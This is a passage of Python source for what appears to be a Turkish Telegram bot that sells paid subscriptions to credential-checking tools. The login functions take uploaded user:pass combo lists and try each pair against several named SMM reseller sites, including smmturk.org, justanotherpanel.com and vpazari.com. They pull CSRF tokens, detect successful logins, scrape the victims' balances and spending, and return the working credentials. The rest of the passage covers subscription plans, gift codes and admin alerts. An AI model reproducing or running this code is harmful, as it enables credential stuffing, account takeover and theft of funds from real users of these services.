      chat_id,
      f"📰 **KURUMEDYA {'Durduruldu' if stopped_early else 'Sonuç'}**\n\n"
      f"📦 {checked}/{total} · ✅ HIT **{len(hits)}** · ❌ {job.get('bads', 0)} · ⚡ {job.get('errors', 0)}",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  active_kurumedy_jobs.pop(user_id, None)
  if not hits:
    try:
      bot.send_message(chat_id, "📭 HIT çıkmadı." + (" (yarıda)" if stopped_early else ""))
    except Exception:
      pass
    return
  _send_checker_hits(chat_id, user_id, "KURUMEDYA", hits, hits_count=len(hits), checked=checked, total=total, stopped=stopped_early)

SMMTURK_URL = "https://smmturk.org/tr"
SMMTURK_UAS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def smmturk_headers(ua):
  return {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://smmturk.org",
    "Referer": "https://smmturk.org/tr",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": ua,
  }

def smmturk_get_csrf(session):
  try:
    resp = session.get(SMMTURK_URL, timeout=15, allow_redirects=True)
    m = re.search(r'name="_csrf"\s+value="([^"]+)"', resp.text)
    if m:
      return m.group(1)
    m2 = re.search(r'name="csrf-token"\s+content="([^"]+)"', resp.text)
    return m2.group(1) if m2 else None
  except Exception:
    return None

def smmturk_capture(session):
  try:
    resp = session.get(SMMTURK_URL, timeout=15, allow_redirects=True)
    html = resp.text or ""
    caps = {}
    vals = re.findall(r'totals-block__count-value[^>]*>([^<]+)</h2>', html)
    if len(vals) >= 3:
      caps["Kullanici"] = vals[0].strip()
      caps["Harcama"] = vals[1].strip()
      caps["Bakiye"] = vals[2].strip()
    elif len(vals) >= 1:
      caps["Kullanici"] = vals[0].strip()
      caps["Harcama"] = "N/A"
      caps["Bakiye"] = "N/A"
    else:
      m1 = re.search(r'Account balance.*?<h2[^>]*>([^<]+)</h2>', html, re.I | re.S)
      caps["Bakiye"] = m1.group(1).strip() if m1 else "N/A"
      m2 = re.search(r'Spent balance.*?<h2[^>]*>([^<]+)</h2>', html, re.I | re.S)
      caps["Harcama"] = m2.group(1).strip() if m2 else "N/A"
      m3 = re.search(r'Welcome to panel!</p>.*?<h2[^>]*>([^<]+)</h2>', html, re.I | re.S)
      caps["Kullanici"] = m3.group(1).strip() if m3 else "N/A"
    return caps
  except Exception:
    return {"Kullanici": "ERR", "Bakiye": "ERR", "Harcama": "ERR"}

def smmturk_check_account(username, password):
  ua = random.choice(SMMTURK_UAS)
  session = requests.Session()
  session.headers.update(smmturk_headers(ua))
  try:
    csrf = smmturk_get_csrf(session)
    if not csrf:
      return False, "ERROR", "CSRF yok"
    data = {
      "LoginForm[username]": username,
      "LoginForm[password]": password,
      "_csrf": csrf,
    }
    resp = session.post(SMMTURK_URL, data=data, timeout=15, allow_redirects=False)
    low = (resp.text or "").lower()
    status = resp.status_code
    hit_signals = [
      "welcome to panel",
      "account balance",
      "spent balance",
      "new order",
      "totals-block__count",
    ]
    bad_signals = [
      "yanlış kullanıcı adı veya şifre",
      "hatalı kullanıcı adı",
      "hatalı şifre",
      "invalid username",
      "invalid password",
    ]
    still_login = 'name="loginform[username]"' in low
    is_redirect = status in (301, 302, 307, 308)
    is_hit_page = any(s in low for s in hit_signals) and not any(s in low for s in bad_signals) and not still_login
    if is_redirect or is_hit_page:
      try:
        session.get(SMMTURK_URL, timeout=15, allow_redirects=True)
      except Exception:
        pass
      caps = smmturk_capture(session)
      detail = (
        f"Kullanici:{caps.get('Kullanici', 'N/A')} | "
        f"Bakiye:{caps.get('Bakiye', 'N/A')} | "
        f"Harcama:{caps.get('Harcama', 'N/A')}"
      )
      return True, "SUCCESS", detail
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def run_smmturk_check_and_send(chat_id, user_id, text: str):
  global active_smmturk_jobs
  if user_id in active_smmturk_jobs and not active_smmturk_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ Zaten bir SMMTÜRK taraması çalışıyor.", parse_mode="Markdown")
    except Exception:
      pass
    return
  lines = _parse_combo_lines(text)
  if not lines:
    try:
      bot.send_message(chat_id, "❌ Geçerli satır yok.\nFormat: `user:pass` veya `email:pass` (ayrıca `|` `;` `,`)", parse_mode="Markdown")
    except Exception:
      pass
    return
  total = len(lines)
  job = {"stop": False, "total": total, "checked": 0, "hits": 0, "bads": 0, "errors": 0, "msg_id": None, "chat_id": chat_id}
  active_smmturk_jobs[user_id] = job
  try:
    msg = bot.send_message(
      chat_id,
      _generic_checker_progress("SMMTÜRK", job),
      reply_markup=_job_stop_markup("smmturk_stop"),
      parse_mode="Markdown",
    )
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("smmturk_panel_start", e)
  hits = []
  last_refresh = 0.0

  def _refresh(force=False, finished=False, stopped=False):
    nonlocal last_refresh
    mid = job.get("msg_id")
    if not mid:
      return
    now = time.time()
    if not force and not finished and not stopped and (now - last_refresh) < 1.0:
      return
    last_refresh = now
    try:
      bot.edit_message_text(
        _generic_checker_progress("SMMTÜRK", job, finished=finished, stopped=stopped),
        chat_id,
        mid,
        reply_markup=None if (finished or stopped) else _job_stop_markup("smmturk_stop"),
        parse_mode="Markdown",
      )
    except Exception:
      pass

  stopped_early = False
  for i, (user, password) in enumerate(lines, 1):
    if active_smmturk_jobs.get(user_id, {}).get("stop"):
      stopped_early = True
      break
    ok, status, detail = smmturk_check_account(user, password)
    job["checked"] = i
    if status == "SUCCESS":
      job["hits"] = int(job.get("hits") or 0) + 1
      hits.append(f"{user}:{password} | {detail}")
    elif status == "BAD":
      job["bads"] = int(job.get("bads") or 0) + 1
    else:
      job["errors"] = int(job.get("errors") or 0) + 1
    _refresh(force=(i % 3 == 0))
    if i < total and not active_smmturk_jobs.get(user_id, {}).get("stop"):
      time.sleep(0.5)
  stopped_early = stopped_early or bool(active_smmturk_jobs.get(user_id, {}).get("stop"))
  _refresh(force=True, finished=not stopped_early, stopped=stopped_early)
  checked = int(job.get("checked") or 0)
  try:
    bot.send_message(
      chat_id,
      f"📈 **SMMTÜRK {'Durduruldu' if stopped_early else 'Sonuç'}**\n\n"
      f"📦 {checked}/{total} · ✅ HIT **{len(hits)}** · ❌ {job.get('bads', 0)} · ⚡ {job.get('errors', 0)}",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  active_smmturk_jobs.pop(user_id, None)
  if not hits:
    try:
      bot.send_message(chat_id, "📭 HIT çıkmadı." + (" (yarıda)" if stopped_early else ""))
    except Exception:
      pass
    return
  _send_checker_hits(chat_id, user_id, "SMMTURK", hits, hits_count=len(hits), checked=checked, total=total, stopped=stopped_early)

def _smm_like_headers(origin, ua=None):
  ua = ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
  return {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": origin,
    "Referer": origin.rstrip("/") + "/",
    "User-Agent": ua,
    "Upgrade-Insecure-Requests": "1",
  }

def _csrf_from_html(html):
  for pat in (
    r'name="_csrf"\s+value="([^"]+)"',
    r'name="_csrf"\s+value=\'([^\']+)\'',
    r'name="csrf-token"\s+content="([^"]+)"',
    r'name="_token"\s+value="([^"]+)"',
    r'value="([^"]+)"[^>]*name="_csrf"',
    r'value="([^"]+)"[^>]*name="_token"',
  ):
    m = re.search(pat, html or "")
    if m:
      return m.group(1)
  return None

def smpanel_check_account(username, password):
  base = "https://smpanel.net/"
  session = requests.Session()
  session.headers.update(_smm_like_headers("https://smpanel.net"))
  try:
    r = session.get(base, timeout=15, allow_redirects=True)
    csrf = _csrf_from_html(r.text)
    if not csrf:
      return False, "ERROR", "CSRF yok"
    resp = session.post(
      base,
      data={"LoginForm[username]": username, "LoginForm[password]": password, "_csrf": csrf},
      timeout=15,
      allow_redirects=False,
    )
    low = (resp.text or "").lower()
    status = resp.status_code
    bad = any(k in low for k in (
      "yanlış kullanıcı adı veya şifre", "hatalı kullanıcı adı", "hatalı şifre",
      "invalid username", "invalid password", "login failed", "authentication failed",
    ))
    is_redir = status in (301, 302, 307, 308)
    still_form = 'name="loginform[username]"' in low
    if bad or status in (401, 403):
      return False, "BAD", "login fail"
    if is_redir or (status == 200 and not still_form):
      try:
        session.get(base, timeout=15, allow_redirects=True)
      except Exception:
        pass
      html = ""
      try:
        html = session.get(base, timeout=15).text or ""
      except Exception:
        html = resp.text or ""
      bal = re.search(r'Bakiyeniz.*?<h5>([^<]+)</h5>', html, re.I | re.S)
      har = re.search(r'Harcad.*?Tutar.*?<h5>([^<]+)</h5>', html, re.I | re.S)
      st = re.search(r'Hesap Stat.*?n.*?z.*?<h5>([^<]+)</h5>', html, re.I | re.S)
      detail = (
        f"Bakiye:{(bal.group(1).strip() if bal else 'N/A')} | "
        f"Harcama:{(har.group(1).strip() if har else 'N/A')} | "
        f"Statu:{(st.group(1).strip() if st else 'N/A')}"
      )
      return True, "SUCCESS", detail
    return False, "BAD", "login fail"
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def worldofsmm_check_account(username, password):
  base = "https://worldofsmm.com"
  session = requests.Session()
  session.headers.update(_smm_like_headers(base))
  try:
    r = session.get(base, timeout=15)
    csrf = _csrf_from_html(r.text)
    if not csrf:
      return False, "ERROR", "CSRF yok"
    resp = session.post(
      base,
      data={"LoginForm[username]": username, "LoginForm[password]": password, "_csrf": csrf},
      timeout=15,
      allow_redirects=True,
    )
    txt = (resp.text or "").lower()
    url = (resp.url or "").lower()
    if any(k in txt for k in (
      "yanlis kullanici adi veya sifre", "yanlış kullanıcı adı veya şifre",
      "wrong username or password", "invalid credentials",
    )) or "loginform[username]" in txt:
      return False, "BAD", "login fail"
    if resp.status_code in (401, 403):
      return False, "BAD", "login fail"
    hit = any(k in txt for k in (
      "username is", "new order", "select services", "total orders",
      "account spending", "account balance",
    )) or ("login" not in url and "giris" not in url and url.rstrip("/") != base.lower())
    if not hit:
      return False, "BAD", "login fail"
    html = resp.text or ""
    bal = re.search(r'Account Balance</h3>\s*<p class="stats-box-txt">([^<]+)</p>', html)
    if not bal:
      bal = re.search(r'Account Balance.*?stats-box-txt">([^<]+)</p>', html, re.S)
    sp = re.search(r'Account Spending</h3>\s*<p class="stats-box-txt">([^<]+)</p>', html)
    if not sp:
      sp = re.search(r'Account Spending.*?stats-box-txt">([^<]+)</p>', html, re.S)
    detail = f"Bakiye:{(bal.group(1).strip() if bal else 'N/A')} | Harcanan:{(sp.group(1).strip() if sp else 'N/A')}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def jap_check_account(username, password):
  """justanotherpanel.com — CSRF dinamik + cookie/Welcome HIT + Orders/Balance capture."""
  base = "https://justanotherpanel.com"
  session = requests.Session()
  session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "Origin": base,
    "Referer": base + "/",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
  })
  try:
    r0 = session.get(base + "/", timeout=15)
    html0 = r0.text or ""
    cookies_before = dict(session.cookies)
    csrf = _csrf_from_html(html0)
    if not csrf:
      m = re.search(r'name=["\']_csrf["\']\s+value=["\']([^"\']+)', html0)
      if not m:
        m = re.search(r'value=["\']([^"\']+)["\']\s+name=["\']_csrf["\']', html0)
      csrf = m.group(1) if m else None
    if not csrf:
      return False, "ERROR", "CSRF yok"
    resp = session.post(
      base,
      data={
        "LoginForm[username]": username,
        "LoginForm[password]": password,
        "_csrf": csrf,
      },
      timeout=15,
      allow_redirects=False,
    )
    html = resp.text or ""
    if "Incorrect username or password" in html:
      return False, "BAD", "login fail"
    cookies_after = dict(session.cookies)
    ok = False
    if cookies_after.get("PHPSESSID") and cookies_after.get("PHPSESSID") != cookies_before.get("PHPSESSID"):
      ok = True
    if len(cookies_after) > len(cookies_before):
      ok = True
    if resp.status_code in (301, 302):
      ok = True
      loc = resp.headers.get("Location") or ""
      if loc.startswith("/"):
        loc = base + loc
      elif loc and not loc.startswith("http"):
        loc = base + "/" + loc
      if loc:
        try:
          html = session.get(loc, timeout=15).text or html
        except Exception:
          pass
    if any(x in html for x in ("Welcome:", "Welcome</strong>", "Total Orders", "Current Balance")):
      ok = True
    if "logout" in html.lower():
      ok = True
    if not ok:
      try:
        dash = session.get(base + "/", timeout=12)
        html = dash.text or html
        if "Welcome:" in html or "logout" in html.lower():
          ok = True
      except Exception:
        pass
    if not ok:
      return False, "BAD", "login fail"
    uname = orders = bal = None
    for pat in (
      r'Welcome:</strong>\s*([^\s<]+)',
      r'Welcome:\s*([^\s<]+)',
      r'<strong>Welcome:</strong>\s*([^\s<]+)',
      r'Welcome\s+([^\s<]+)',
    ):
      m = re.search(pat, html)
      if m:
        uname = m.group(1).strip()
        break
    for pat in (
      r'Total Orders:</strong>\s*([^\s<]+)',
      r'Total Orders:\s*([^\s<]+)',
      r'<strong>Total Orders:</strong>\s*([^\s<]+)',
    ):
      m = re.search(pat, html)
      if m:
        orders = m.group(1).strip()
        break
    for pat in (
      r'Current Balance:</strong>\s*([^\s<]+)',
      r'Current Balance:\s*([^\s<]+)',
      r'<strong>Current Balance:</strong>\s*([^\s<]+)',
    ):
      m = re.search(pat, html)
      if m:
        bal = m.group(1).strip()
        break
    if not bal and "****" in html:
      bal = "****"
    detail = f"{uname or username} | Orders:{orders or '0'} | Balance:{bal or 'N/A'}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def vpazari_check_account(email, password):
  base = "https://www.vpazari.com"
  login_url = f"{base}/login"
  session = requests.Session()
  session.headers.update(_smm_like_headers(base))
  session.headers["Referer"] = login_url
  try:
    r = session.get(login_url, timeout=15)
    token = _csrf_from_html(r.text)
    if not token:
      return False, "ERROR", "CSRF yok"
    resp = session.post(
      login_url,
      data={"_token": token, "email": email, "password": password},
      timeout=15,
      allow_redirects=True,
    )
    low = (resp.text or "").lower()
    url = (resp.url or "").lower()
    bad = any(k in low for k in (
      "basarisiz", "hatali", "kullanici veya sifre", "invalid", "incorrect", "wrong", "failed",
      "these credentials do not match",
    ))
    good = any(k in low for k in (
      "hesap ayar", "account settings", "cikis yap", "logout", "dashboard",
      "siparislerim", "cuzdan",
    )) or any(k in url for k in ("hesap", "account", "dashboard", "profil", "profile", "user"))
    if bad and not good:
      return False, "BAD", "login fail"
    if not good and "login" in url:
      return False, "BAD", "login fail"
    wallet = "N/A"
    try:
      wr = session.get(f"{base}/user/balance", timeout=15)
      m = re.search(r'Cüzdan Bakiyeniz.*?<h1[^>]*>([^<]+)</h1>', wr.text or "", re.S)
      if not m:
        m = re.search(r'<h1[^>]*class="[^"]*fw-bold[^"]*">([^<]+)</h1>', wr.text or "")
      if m:
        wallet = m.group(1).strip()
    except Exception:
      pass
    order_n = 0
    try:
      orr = session.get(f"{base}/user/orders", timeout=15)
      rows = re.findall(r'<tr[^>]*>', orr.text or "")
      order_n = max(0, len(rows) - 1)
    except Exception:
      pass
    detail = f"Cüzdan:{wallet} | Sipariş:~{order_n}"
    return True, "SUCCESS", detail
  except requests.exceptions.RequestException as e:
    return False, "ERROR", f"req: {str(e)[:100]}"
  except Exception as e:
    return False, "ERROR", f"exc: {str(e)[:100]}"

def _extract_combo_from_message(message, chat_id, label="Checker"):
  """Metin veya .txt dosyasından combo al. Büyük dosyada retry + uzun timeout."""
  if message.document:
    try:
      fname = (message.document.file_name or "").lower()
      fsize = int(getattr(message.document, "file_size", 0) or 0)
      if fname.endswith((".rar", ".zip", ".7z", ".gz", ".tar", ".bz2")):
        return None, "❌ Arşiv değil, **.txt** gönder."
      if not (fname.endswith((".txt", ".log", ".csv")) or (message.document.mime_type or "").startswith("text") or not fname):
        return None, "❌ **.txt** gönder."
      if fsize > 20 * 1024 * 1024:
        return None, "❌ Dosya çok büyük (max ~20 MB)."
      if fsize > 400 * 1024:
        try:
          safe_tg(
            bot.send_message,
            chat_id,
            f"⏳ Büyük dosya ({fsize // 1024} KB), indiriliyor...\nAğ yavaşsa 1-2 dk sürebilir. Bolup (max 200 KB) da gonderebilirsin.",
          )
        except Exception:
          pass

      last_err = None
      for attempt in range(4):
        try:
          file_info = None
          try:
            file_info = bot.get_file(message.document.file_id)
          except Exception:
            r = requests.get(
              f"https://api.telegram.org/bot{TOKEN}/getFile",
              params={"file_id": message.document.file_id},
              timeout=90,
            )
            data = r.json()
            if not data.get("ok"):
              raise Exception(data.get("description") or "getFile fail")
            class _FI(object):
              pass
            file_info = _FI()
            file_info.file_path = data["result"]["file_path"]
          downloaded = None
          try:
            downloaded = bot.download_file(file_info.file_path)
          except Exception:
            url = f"https://api.telegram.org/file/bot{TOKEN}/{file_info.file_path}"
            rr = requests.get(url, timeout=180)
            rr.raise_for_status()
            downloaded = rr.content
          payload = downloaded if isinstance(downloaded, (bytes, bytearray)) else str(downloaded).encode("utf-8", errors="ignore")
          combo_text = payload.decode("utf-8", errors="ignore")
          if not combo_text.strip():
            return None, "❌ Dosya boş."
          return combo_text, None
        except Exception as e:
          last_err = e
          log_error(f"{label}_doc_try{attempt}", e)
          time.sleep(2 + attempt * 2)
      return None, (
        "❌ Dosya alınamadı (ağ timeout).\n"
        "• WiFi dene · dosyayı 200-300 KB parçalara böl\n"
        f"• Teknik: {str(last_err)[:80]}"
      )
    except Exception as e:
      log_error(f"{label}_doc", e)
      return None, f"❌ Dosya alınamadı: {str(e)[:120]}"
  if message.text:
    t = message.text.strip()
    if t.lower() in ("/iptal", "iptal", "/cancel", "cancel"):
      return None, "IPTAL"
    return t, None
  return None, "❌ Metin veya 📎 `.txt` gönder · /iptal"

def get_checker_workers(user_id, default=None):
  """Kullanıcının seçtiği checker thread sayısı (min 2, max 8)."""
  if default is None:
    default = CHECKER_SPEED_DEFAULT
  try:
    w = int(user_checker_workers.get(user_id) or default)
  except Exception:
    w = int(default)
  return max(CHECKER_SPEED_MIN, min(CHECKER_SPEED_MAX, w))

def set_checker_workers(user_id, workers):
  try:
    w = int(workers)
  except Exception:
    w = CHECKER_SPEED_DEFAULT
  user_checker_workers[user_id] = max(CHECKER_SPEED_MIN, min(CHECKER_SPEED_MAX, w))
  return user_checker_workers[user_id]

def _checker_speed_markup(label="Checker"):
  markup = types.InlineKeyboardMarkup(row_width=4)
  row1 = [types.InlineKeyboardButton(str(i), callback_data=f"chk_speed_{i}") for i in range(2, 6)]
  row2 = [types.InlineKeyboardButton(str(i), callback_data=f"chk_speed_{i}") for i in range(6, 9)]
  markup.row(*row1)
  markup.row(*row2)
  markup.add(types.InlineKeyboardButton("❌ İptal", callback_data="chk_speed_cancel"))
  return markup

def has_checker_sub(user_id):
  """Aktif checker aboneliği var mı? Admin her zaman True."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if uid in admin_ids_set:
    return True
  info = checker_subs.get(uid) or checker_subs.get(str(uid))
  if not info or not isinstance(info, dict):
    return False
  until = float(info.get("until") or 0)
  if until <= 0:
    return True
  return time.time() < until

def checker_sub_status_text(user_id):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if uid in admin_ids_set:
    return "👑 Admin — sınırsız checker"
  info = checker_subs.get(uid) or checker_subs.get(str(uid))
  if not info:
    return "❌ Aktif abonelik yok"
  plan = str(info.get("plan") or "?")
  title = (CHECKER_SUB_PLANS.get(plan) or {}).get("title") or plan
  until = float(info.get("until") or 0)
  if until <= 0:
    return f"✅ **{title}** (ömür boyu)"
  left = max(0, int(until - time.time()))
  if left <= 0:
    return "❌ Abonelik süresi dolmuş"
  d = left // 86400
  h = (left % 86400) // 3600
  return f"✅ **{title}**\n⏳ Kalan: **{d}g {h}s**"

def grant_checker_sub(user_id, plan_key, via="balance"):
  """Abonelik ver. plan_key: 1d|7d|30d|life
  Omur boyu (until<=0) asla gunluk/haftalik ile ezilmez.
  """
  plan = CHECKER_SUB_PLANS.get(plan_key)
  if not plan:
    return False, "Gecersiz plan"
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  days = int(plan.get("days") or 0)
  now = time.time()
  prev = checker_subs.get(uid) or checker_subs.get(str(uid)) or {}
  if not isinstance(prev, dict):
    prev = {}
  prev_until = float(prev.get("until") or 0) if prev else 0.0
  is_life = bool(prev) and prev_until <= 0 and str(prev.get("plan") or "") in ("life", "1d", "7d", "30d", "")
  is_life = bool(prev) and ("until" in prev) and prev_until <= 0
  if days <= 0:
    checker_subs[uid] = {
      "plan": "life",
      "until": 0.0,
      "bought": get_current_time_str(),
      "via": via,
    }
    try:
      checker_subs.pop(str(uid), None)
    except Exception:
      pass
  elif is_life:
    return False, "Zaten omur boyu (sinirsiz) aboneligin var. Gunluk/haftalik bunun ustune yazilmaz."
  else:
    base = now
    if prev and prev_until > now and days > 0:
      base = prev_until
    until = base + days * 86400
    checker_subs[uid] = {
      "plan": plan_key,
      "until": until,
      "bought": get_current_time_str(),
      "via": via,
    }
    try:
      checker_subs.pop(str(uid), None)
    except Exception:
      pass
  try:
    save_data()
  except Exception:
    pass
  try:
    log_activity("checker_sub", uid, f"{plan_key}:{via}")
  except Exception:
    pass
  status = checker_sub_status_text(uid)
  try:
    notify_admins_checker_sub(uid, plan_key, via)
  except Exception as e:
    try:
      log_error("notify_sub", e)
    except Exception:
      pass
  try:
    _plan = CHECKER_SUB_PLANS.get(plan_key) or {}
    sub_purchase_log.append({
      "uid": int(uid) if str(uid).isdigit() else uid,
      "plan": plan_key,
      "via": str(via),
      "tl": float(_plan.get("tl") or 0),
      "stars": int(_plan.get("stars") or 0),
      "ts": time.time(),
      "time_str": get_current_time_str(),
    })
    if len(sub_purchase_log) > 500:
      del sub_purchase_log[:-500]
    save_data()
  except Exception:
    pass
  return True, status

def revoke_checker_sub(user_id, by_admin=None):
  """Aboneliği iptal et."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  had = checker_subs.pop(uid, None)
  if had is None:
    try:
      had = checker_subs.pop(str(uid), None)
    except Exception:
      had = None
  try:
    save_data()
  except Exception:
    pass
  try:
    log_activity("checker_sub_revoke", uid, f"by={by_admin}")
  except Exception:
    pass
  return had is not None

def notify_admins_checker_sub(user_id, plan_key, via="balance"):
  """Her abonelik aliminda adminlere bildirim."""
  plan = CHECKER_SUB_PLANS.get(plan_key) or {}
  title = plan.get("title") or plan_key
  via_map = {
    "balance": "Bot bakiyesi",
    "stars": "Yildiz",
    "admin": "Admin hediye",
    "admin_grant": "Admin verdi",
  }
  via_txt = via_map.get(str(via), str(via))
  uname = str(user_id)
  try:
    ch = bot.get_chat(user_id)
    if getattr(ch, "username", None):
      uname = "@" + str(ch.username)
    elif getattr(ch, "first_name", None):
      uname = ch.first_name
  except Exception:
    pass
  price = plan.get("tl") or 0
  stars = plan.get("stars") or 0
  lines = [
    "Yeni checker abonelik",
    "",
    "Kullanici: %s (%s)" % (uname, user_id),
    "Paket: %s" % (title,),
    "Odeme: %s" % (via_txt,),
    "Tutar: %s TL / %s yildiz" % (int(float(price)), stars),
    "Zaman: %s" % (get_current_time_str(),),
  ]
  msg = "\n".join(lines)
  for aid in list(admin_ids_set):
    try:
      bot.send_message(aid, msg)
    except Exception:
      pass

def list_active_checker_subs(limit=30):
  """Aktif aboneleri listele."""
  now = time.time()
  rows = []
  for uid, info in list((checker_subs or {}).items()):
    if not isinstance(info, dict):
      continue
    until = float(info.get("until") or 0)
    if until > 0 and until < now:
      continue
    plan = str(info.get("plan") or "?")
    title = (CHECKER_SUB_PLANS.get(plan) or {}).get("title") or plan
    via = info.get("via") or "?"
    bought = info.get("bought") or "?"
    if until <= 0:
      left = "ömür"
    else:
      d = int((until - now) // 86400)
      left = f"{d}g"
    rows.append((str(uid), title, left, via, bought))
  rows.sort(key=lambda x: x[0])
  return rows[:limit]

def send_fake_sub_receipt(chat_id, user_id, plan_key, amount_tl, method="Bakiye", gift_code=None):
  """Odeme dekontu. gift_code varsa abonelik aliciya yazilmadi."""
  plan = CHECKER_SUB_PLANS.get(plan_key) or {}
  title = plan.get("title") or plan_key
  rid = uuid.uuid4().hex[:10].upper()
  uname = str(user_id)
  try:
    ch = bot.get_chat(user_id)
    if getattr(ch, "username", None):
      uname = "@" + str(ch.username)
    elif getattr(ch, "first_name", None):
      uname = ch.first_name
  except Exception:
    pass
  bal = float(user_balances.get(user_id, 0) or 0)
  is_gift = bool(gift_code) or ("hediye" in str(method).lower()) or ("gift" in str(method).lower())
  if is_gift:
    status_lines = ["HEDIYE KODU OLUSTURULDU"]
    if gift_code:
      status_lines.append("Kod: " + str(gift_code))
    status_lines.append("Sana abonelik YAZILMADI.")
    status_lines.append("Kodu yazan kisi Premium olur.")
    status = chr(10).join(status_lines)
    urun = "Checker Abonelik (Hediye kod)"
  else:
    status = checker_sub_status_text(user_id).replace("**", "")
    urun = "Checker Abonelik"
  lines = [
    "ODEME DEKONTU",
    "",
    "Dekont No: " + rid,
    "Tarih: " + str(get_current_time_str()),
    "Kullanici: %s (%s)" % (uname, user_id),
    "",
    "Urun: " + urun,
    "Paket: " + str(title),
    "Odeme: " + str(method),
    "Tutar: %.2f TL" % float(amount_tl),
    "",
    "Durum: BASARILI",
    "Kalan bakiye: %.2f TL" % bal,
    "",
    status,
    "",
    str(BOT_BRAND) + " · Otomatik dekont",
  ]
  text_msg = chr(10).join(lines)
  try:
    bot.send_message(chat_id, text_msg)
  except Exception:
    pass

def generate_premium_code():
  return ("NP" + uuid.uuid4().hex[:8]).upper()

def create_premium_gift_code(buyer_id, plan_key, via="balance", custom_code=None):
  plan = CHECKER_SUB_PLANS.get(plan_key)
  if not plan:
    return None, "Gecersiz plan"
  if custom_code:
    code = "".join(ch for ch in str(custom_code).upper() if ch.isalnum() or ch in ("_", "-"))
    if len(code) < 4:
      return None, "Ozel kod cok kisa"
    if code in premium_codes and not (premium_codes.get(code) or {}).get("used_by"):
      return None, "Bu kod zaten var"
  else:
    code = generate_premium_code()
    n = 0
    while code in premium_codes and n < 20:
      code = generate_premium_code()
      n += 1
  premium_codes[code] = {
    "plan": plan_key,
    "buyer_id": int(buyer_id) if str(buyer_id).isdigit() else buyer_id,
    "created": get_current_time_str(),
    "ts": time.time(),
    "via": via,
    "used_by": None,
    "used_at": None,
  }
  try:
    save_data()
  except Exception:
    pass
  try:
    log_activity("prem_code_create", buyer_id, "%s:%s" % (code, plan_key))
  except Exception:
    pass
  return code, plan.get("title") or plan_key

def redeem_premium_code(user_id, code):
  code = (code or "").strip().upper()
  if not code:
    return False, "Kod bos."
  info = premium_codes.get(code)
  if not info or not isinstance(info, dict):
    return False, "Kod gecersiz."
  if info.get("used_by"):
    return False, "Bu kod daha once kullanilmis."
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if has_checker_sub(uid):
    return False, "Zaten aktif aboneligin var. Bittikten sonra kod kullan."
  plan_key = str(info.get("plan") or "")
  if plan_key not in CHECKER_SUB_PLANS:
    return False, "Kod bozuk."
  ok, msg = grant_checker_sub(uid, plan_key, via="gift_code")
  if not ok:
    return False, msg
  info["used_by"] = uid
  info["used_at"] = get_current_time_str()
  premium_codes[code] = info
  try:
    save_data()
  except Exception:
    pass
  try:
    log_activity("prem_code_redeem", uid, code)
  except Exception:
    pass
  tag = str(uid)
  uname = ""
  fname = ""
  try:
    ch = bot.get_chat(uid)
    if getattr(ch, "username", None):
      uname = str(ch.username)
      tag = "@" + uname
    if getattr(ch, "first_name", None):
      fname = str(ch.first_name)
      if not uname:
        tag = fname
  except Exception:
    pass
  plan_title = (CHECKER_SUB_PLANS.get(plan_key) or {}).get("title") or plan_key
  lines = [
    "Hediye kodu kullanildi",
    "",
    "Kod: " + str(code),
    "Paket: " + str(plan_title),
    "Kullanan: " + str(fname or tag),
    "ID: " + str(uid),
    "Tag: " + (("@" + uname) if uname else "-"),
    "Zaman: " + str(get_current_time_str()),
  ]
  notify_txt = chr(10).join(lines)
  buyer = info.get("buyer_id")
  try:
    if buyer is not None and int(buyer) != int(uid):
      bot.send_message(int(buyer), notify_txt)
  except Exception:
    pass
  for aid in list(admin_ids_set):
    try:
      if buyer is not None and int(aid) == int(buyer):
        continue
      if int(aid) == int(uid):
        continue
      bot.send_message(int(aid), notify_txt)
    except Exception:
      pass
  return True, msg

def buy_checker_sub_balance(user_id, plan_key, mode="self", custom_code=None):
